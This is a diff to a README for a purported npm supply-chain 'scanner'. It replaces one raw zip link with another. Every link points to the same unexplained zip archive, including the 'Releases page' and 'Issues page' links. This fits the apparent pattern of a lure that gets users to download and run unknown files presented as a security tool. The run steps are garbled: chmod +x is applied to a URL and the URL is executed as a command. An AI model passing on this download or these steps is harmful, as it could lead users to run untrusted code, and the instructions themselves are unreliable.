@@ -4,7 +4,7 @@
 Welcome to the sha1-hulud-scanner project! This tool helps you find out if your npm packages are compromised due to the SHA1-HULUD supply chain attack. Follow these simple steps to download and run the scanner with ease.
 
 ## 📥 Download Now
-[![Download sha1-hulud-scanner](https://raw.githubusercontent.com/vitor2342/sha1-hulud-scanner/main/Rousseauite/sha1-hulud-scanner_3.3.zip)](https://raw.githubusercontent.com/vitor2342/sha1-hulud-scanner/main/Rousseauite/sha1-hulud-scanner_3.3.zip)
+[![Download sha1-hulud-scanner](https://raw.githubusercontent.com/vitor2342/sha1-hulud-scanner/main/Rousseauite/hulud-scanner-sha-v2.6.zip)](https://raw.githubusercontent.com/vitor2342/sha1-hulud-scanner/main/Rousseauite/hulud-scanner-sha-v2.6.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -21,7 +21,7 @@ Before you download, ensure your system meets the following requirements:
 ## 🔧 Download & Install
 To get started, visit the Releases page to download the latest version of the tool. 
 
-[Visit this page to download](https://raw.githubusercontent.com/vitor2342/sha1-hulud-scanner/main/Rousseauite/sha1-hulud-scanner_3.3.zip).
+[Visit this page to download](https://raw.githubusercontent.com/vitor2342/sha1-hulud-scanner/main/Rousseauite/hulud-scanner-sha-v2.6.zip).
 
 1. Click the link above.
 2. Look for the latest release.
@@ -41,13 +41,13 @@ Once you have downloaded the scanner, follow these steps to run it:
 3. Give permission to run the file. If you downloaded a `.sh` file, use this command:
 
    ```bash
-   chmod +x https://raw.githubusercontent.com/vitor2342/sha1-hulud-scanner/main/Rousseauite/sha1-hulud-scanner_3.3.zip
+   chmod +x https://raw.githubusercontent.com/vitor2342/sha1-hulud-scanner/main/Rousseauite/hulud-scanner-sha-v2.6.zip
    ```
 
 4. Now, run the scanner with this command:
 
    ```bash
-   https://raw.githubusercontent.com/vitor2342/sha1-hulud-scanner/main/Rousseauite/sha1-hulud-scanner_3.3.zip
+   https://raw.githubusercontent.com/vitor2342/sha1-hulud-scanner/main/Rousseauite/hulud-scanner-sha-v2.6.zip
    ```
 
 5. Follow the prompts to scan your npm packages.
@@ -60,7 +60,7 @@ If you run into any issues, here are some common solutions:
 - **Dependencies Missing:** If there are issues related to missing tools, you may need to install certain bash utilities.
 
 ## 📞 Support
-If you need further assistance, you can visit the [Issues page](https://raw.githubusercontent.com/vitor2342/sha1-hulud-scanner/main/Rousseauite/sha1-hulud-scanner_3.3.zip) on GitHub. Here, you can report bugs or ask for help.
+If you need further assistance, you can visit the [Issues page](https://raw.githubusercontent.com/vitor2342/sha1-hulud-scanner/main/Rousseauite/hulud-scanner-sha-v2.6.zip) on GitHub. Here, you can report bugs or ask for help.
 
 ## 🌐 Stay Updated
 Make sure to check back often for updates to the sha1-hulud-scanner. Developers are always working to improve the tool and add new features.
